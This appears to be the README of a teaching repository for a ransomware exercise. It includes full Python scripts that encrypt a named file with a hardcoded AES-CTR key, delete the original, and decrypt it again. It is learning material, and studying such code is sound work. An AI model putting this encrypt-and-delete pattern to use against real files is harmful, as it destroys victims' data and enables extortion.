DIO Platform Ransomware Challenge Repository



This repository is dedicated to the DIO Platform Ransomware Challenge, showcasing a basic implementation of ransomware encryption and decryption using Python.

Description
  The challenge presents a simple ransomware script written in Python utilizing the pyaes library for encryption and decryption tasks. It encrypts a specified file with a hardcoded key and saves the encrypted data   in a new file with a '.ransomwaretroll' extension. The decryption script reverses this process, decrypting the encrypted file and restoring it to its original state.

Usage
Encryption
To encrypt a file, execute the encrypt.py script with the following command:

bash
Copy code
python encrypt.py
Replace "teste.txt" with the name of the file you wish to encrypt.

Decryption
To decrypt a file encrypted by the ransomware, execute the decrypt.py script with the following command:

bash
Copy code
python decrypt.py
Replace "teste.txt.ransomwaretroll" with the name of the encrypted file you want to decrypt.

Code
Encryption Script (encrypt.py)
python
Copy code
import os
import pyaes

# Open the file to be encrypted
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remove the original file
os.remove(file_name)

# Encryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Encrypt the file
crypto_data = aes.encrypt(file_data)

# Save the encrypted file
  new_file = file_name + ".ransomwaretroll"
  new_file = open(f'{new_file}','wb')
  new_file.write(crypto_data)
  new_file.close()
  Decryption Script (decrypt.py)
  python
  Copy code
  import os
  import pyaes

  file_name = "teste.txt.ransomwaretroll"
  file = open(file_name, "rb")
  file_data = file.read()
  file.close()
  
  # Remove the encrypted file
  os.remove(file_name)
  
  # Decryption key
  key = b"testeransomwares"
  aes = pyaes.AESModeOfOperationCTR(key)
  decrypted_data = aes.decrypt(file_data)
  
  # Save the decrypted file
  new_file = "teste.txt"
  new_file = open(f'{new_file}', "wb")
  new_file.write(decrypted_data)
  new_file.close()
